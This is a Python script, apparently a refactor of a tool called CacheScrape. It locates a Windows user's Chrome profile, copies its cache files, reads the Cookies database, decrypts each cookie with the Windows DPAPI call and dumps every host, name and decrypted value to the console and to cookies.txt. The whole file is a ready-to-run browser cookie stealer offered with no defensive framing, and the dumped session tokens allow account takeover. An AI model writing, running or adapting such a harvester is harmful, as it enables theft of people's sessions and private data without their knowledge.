# Full 1:1 Refactor of CacheScrape.py

import os
import sqlite3
import base64
import shutil
import win32crypt
from pathlib import Path
from datetime import datetime
from typing import List, Tuple, Optional

class CacheScraper:
    def __init__(self, user_profile: Optional[str] = None):
        if not user_profile:
            from getpass import getuser
            user_profile = f"C:/Users/{getuser()}"
        self.profile = Path(user_profile)

        self.chrome_cache_path = self.profile / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cache"
        self.chrome_cookies_path = self.profile / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Cookies"

        self.cache_files: List[Tuple[str, int]] = []
        self.cookies: List[Tuple[str, str, str]] = []

    def extract_cache_files(self) -> List[Tuple[str, int]]:
        if not self.chrome_cache_path.exists():
            print(f"[!] Cache path not found: {self.chrome_cache_path}")
            return []

        for file in self.chrome_cache_path.iterdir():
            if file.is_file():
                try:
                    self.cache_files.append((file.name, file.stat().st_size))
                except Exception as e:
                    print(f"[!] Error reading cache file {file.name}: {e}")

        return self.cache_files

    def extract_cookies(self) -> List[Tuple[str, str, str]]:
        if not self.chrome_cookies_path.exists():
            print(f"[!] Cookie database not found: {self.chrome_cookies_path}")
            return []

        try:
            conn = sqlite3.connect(self.chrome_cookies_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

            for host, name, encrypted_value in cursor.fetchall():
                decrypted = self._decrypt_cookie(encrypted_value)
                if decrypted:
                    self.cookies.append((host, name, decrypted))

        except Exception as e:
            print(f"[!] Failed to extract cookies: {e}")

        finally:
            conn.close()

        return self.cookies

    def _decrypt_cookie(self, encrypted: bytes) -> Optional[str]:
        try:
            decrypted = win32crypt.CryptUnprotectData(encrypted, None, None, None, 0)[1]
            return decrypted.decode('utf-8')
        except Exception as e:
            print(f"[!] Failed to decrypt cookie: {e}")
            return None

    def export_cache(self, export_path: Path):
        export_path.mkdir(parents=True, exist_ok=True)

        for file_name, _ in self.cache_files:
            src = self.chrome_cache_path / file_name
            dst = export_path / file_name
            try:
                shutil.copy2(src, dst)
            except Exception as e:
                print(f"[!] Failed to copy {file_name}: {e}")

    def export_cookies_to_file(self, file_path: Path):
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                for host, name, value in self.cookies:
                    f.write(f"{host}\t{name}\t{value}\n")
        except Exception as e:
            print(f"[!] Failed to export cookies: {e}")


if __name__ == '__main__':
    scraper = CacheScraper()

    print("[+] Extracting Chrome Cache Files...")
    cache_files = scraper.extract_cache_files()
    for name, size in cache_files:
        print(f" - {name}: {size} bytes")

    print("\n[+] Extracting Cookies...")
    cookies = scraper.extract_cookies()
    for host, name, value in cookies:
        print(f" - {host}: {name} = {value}")

    print("\n[+] Exporting Cache Files to ./cache_dump")
    scraper.export_cache(Path("cache_dump"))

    print("[+] Exporting Cookies to ./cookies.txt")
    scraper.export_cookies_to_file(Path("cookies.txt"))
